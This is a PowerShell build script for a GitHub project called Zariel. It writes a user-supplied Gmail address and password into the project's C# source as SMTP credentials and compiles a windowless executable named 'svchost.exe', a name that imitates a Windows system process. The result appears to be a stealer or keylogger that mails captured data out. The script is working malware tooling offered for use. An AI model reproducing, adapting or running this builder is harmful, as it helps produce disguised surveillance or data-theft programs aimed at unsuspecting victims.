param($mail, $pass)
if(Test-Path "aa.cs"){
    del aa.cs
}
echo "
  ________      ___      .______       __   _______  __      
 |       /     /   \     |   _  \     |  | |   ____||  |     
  `---/  /     /  ^  \    |  |_)  |    |  | |  |__   |  |     
    /  /     /  /_\  \   |      /     |  | |   __|  |  |     
   /  /----./  _____  \  |  |\  \----.|  | |  |____ |  `----.
  /________/__/     \__\ | _|  `._____||__| |_______||_______|

  https://github.com/diego-tella/Zariel/
                                                            
"


if (!$mail -Or !$pass)
{
    echo "Pass two arguments, your e-mail and your password!"
    echo "Example: .\compila.ps1 myemail@gmail.com mypass"
    exit
}
else
{
    if(!$mail.Contains("@gmail.com")){
        echo "Could you use a gmail account? For now the program only accepts gmail, but soon it will allow other mail servers as well. Keep an eye on our github."
        exit
    }
    else{
        echo "Your chosen email: $mail"
        echo "your chosen password: $pass"
        echo "Creating your executable file..."
        $i = 0
        $path = pwd
        foreach($line in [System.IO.File]::ReadLines("$path\src\Form1.cs"))
        {
            $i++
            if($i -eq 95){
                Add-Content -Path aa.cs -Value "                email.To.Add(new MailAddress(`"$mail`"));"
            }
            elseif($i -eq 96){
                Add-Content -Path aa.cs -Value "                email.From = new MailAddress(`"$mail`");"
            }
            elseif($i -eq 106){
                Add-Content -Path aa.cs -Value "                cliente.Credentials = new System.Net.NetworkCredential(`"$mail`", `"$pass`");"
            }
            else{
                Add-Content -Path aa.cs -Value $line
            }
                        
        }
        echo "Generated code..."
        copy .\src\Form1.Designer.cs .
        copy .\src\Program.cs .
        echo "Compiling..."
        try{
            C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:winexe /out:svchost.exe /win32manifest:src/app.manifest *.cs
        }
        catch{
            echo "An error occurred when compiling. Do you really have the C# compiler on your computer? (csc.exe). If you have and are giving this error, put the correct path of it in the script."
            exit
        }
        echo "EXE DONE! Check out svchost.exe!"
        echo "The executable file was created with the name `"svchost.exe`". Feel free to change according to your choices"
        del *.cs
    }
}
